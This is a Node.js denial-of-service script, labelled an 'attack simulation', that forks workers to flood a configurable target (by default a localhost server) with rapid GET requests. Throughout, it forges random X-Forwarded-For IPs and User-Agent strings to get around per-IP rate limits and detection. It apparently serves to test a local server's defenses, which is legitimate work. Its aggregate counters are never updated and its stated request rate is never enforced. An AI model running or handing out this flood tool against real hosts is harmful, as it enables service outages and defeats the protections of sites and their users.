const axios = require("axios");
const http = require("http");
const cluster = require("cluster");
const numCPUs = require("os").cpus().length;

// Configuration
const CONFIG = {
  target: "http://localhost:3001",
  attackDuration: 60000, // 60 seconds
  requestsPerSecond: 1000, // Increased for more intense attack
  workers: 2, // Fewer workers for better reliability
  attackType: "ddos",
  endpoints: ["/", "/health", "/api/status"],
  useAxios: false, // Set to false to use simpler http
  // Set a single source IP if you want a focused attack
  singleSourceAttack: true, // This will make all requests appear to come from the same IP
};

// Simplified payloads
const SAMPLE_PAYLOADS = {
  "/": {
    timestamp: Date.now(),
  },
  "/health": {
    check: "ping",
  },
  "/api/status": {
    type: "status",
  },
};

// Generate random IP for DDOS simulation
function generateRandomIP() {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(
    Math.random() * 255
  )}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

// Generate random user agent
function generateRandomUserAgent() {
  const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15",
  ];
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Get target URL
function getTargetUrl() {
  // Remove http:// from the target for the http module
  let target = CONFIG.target.replace(/^https?:\/\//, "");
  let port = 3001; // Default port

  // Extract hostname and port if present
  if (target.includes(":")) {
    const parts = target.split(":");
    target = parts[0];
    port = parseInt(parts[1]);
  }

  return { hostname: target, port };
}

// Main attack function
async function attack() {
  const startTime = Date.now();
  let requestCount = 0;
  let errorCount = 0;
  let successCount = 0;

  // Generate a source IP - either fixed for DOS or for a single-source DDoS simulation
  // or dynamic for distributed DDoS
  const sourceIP =
    CONFIG.singleSourceAttack || CONFIG.attackType === "dos"
      ? generateRandomIP()
      : null;

  const targetInfo = getTargetUrl();

  // Create agent to reuse connections
  const agent = new http.Agent({ keepAlive: true, maxSockets: 50 });

  console.log(
    `Worker ${process.pid} attacking ${targetInfo.hostname}:${targetInfo.port}${
      sourceIP ? " from IP " + sourceIP : ""
    }`
  );

  while (Date.now() - startTime < CONFIG.attackDuration) {
    try {
      const endpoint =
        CONFIG.endpoints[Math.floor(Math.random() * CONFIG.endpoints.length)];

      if (CONFIG.useAxios) {
        // Use axios for requests
        const headers = {
          "User-Agent": generateRandomUserAgent(),
          "X-Forwarded-For": sourceIP || generateRandomIP(),
          Accept: "application/json",
          Connection: "keep-alive",
        };

        await axios({
          method: "GET",
          url: CONFIG.target + endpoint,
          headers: headers,
          timeout: 2000, // Increased timeout
        });
      } else {
        // Use simpler http module for faster requests
        await new Promise((resolve, reject) => {
          const req = http.get(
            {
              hostname: targetInfo.hostname,
              port: targetInfo.port,
              path: endpoint,
              agent: agent,
              headers: {
                "User-Agent": generateRandomUserAgent(),
                "X-Forwarded-For": sourceIP || generateRandomIP(),
                Accept: "application/json",
                Connection: "keep-alive",
              },
              timeout: 1000,
            },
            (res) => {
              let data = "";
              res.on("data", (chunk) => {
                data += chunk;
              });
              res.on("end", () => {
                successCount++;
                resolve();
              });
            }
          );

          req.on("error", (e) => {
            errorCount++;
            reject(e);
          });

          req.on("timeout", () => {
            req.destroy();
            errorCount++;
            reject(new Error("Timeout"));
          });
        }).catch(() => {
          // Just catch errors silently - we're already counting them
        });
      }

      requestCount++;

      // Log progress every 100 requests
      if (requestCount % 100 === 0) {
        console.log(
          `Worker ${process.pid}: ${requestCount} requests sent (${successCount} success, ${errorCount} errors)`
        );
      }

      // Small delay between requests
      if (requestCount % 10 === 0) {
        await new Promise((resolve) => setTimeout(resolve, 1));
      }
    } catch (error) {
      errorCount++;
      if (errorCount % 100 === 0) {
        console.error(`Worker ${process.pid} error count: ${errorCount}`);
      }
      continue;
    }
  }

  return { requestCount, successCount, errorCount };
}

// Main execution
if (cluster.isPrimary || cluster.isMaster) {
  // Handle both newer and older Node.js versions
  console.log(`Starting ${CONFIG.attackType.toUpperCase()} attack simulation`);
  console.log(`Target: ${CONFIG.target}`);
  console.log(`Duration: ${CONFIG.attackDuration / 1000} seconds`);
  console.log(`Workers: ${CONFIG.workers}`);
  console.log(`Method: ${CONFIG.useAxios ? "axios" : "http"}`);
  console.log(
    `Target Request Rate: ~${
      CONFIG.requestsPerSecond * CONFIG.workers
    } per second total`
  );
  console.log("----------------------------------------");

  let totalRequests = 0;
  let totalSuccess = 0;
  let totalErrors = 0;

  // Fork workers
  for (let i = 0; i < CONFIG.workers; i++) {
    cluster.fork();
  }

  // Handle worker exit
  cluster.on("exit", (worker, code, signal) => {
    console.log(`Worker ${worker.process.pid} finished`);
  });

  // Log total stats every 5 seconds
  setInterval(() => {
    console.log(
      `Total stats - Requests: ${totalRequests}, Success: ${totalSuccess}, Errors: ${totalErrors}`
    );
  }, 5000);
} else {
  // Worker process - start attack
  attack().then(({ requestCount, successCount, errorCount }) => {
    console.log(
      `Worker ${process.pid} completed. Sent ${requestCount} requests (${successCount} success, ${errorCount} errors)`
    );
    process.exit(0);
  });
}
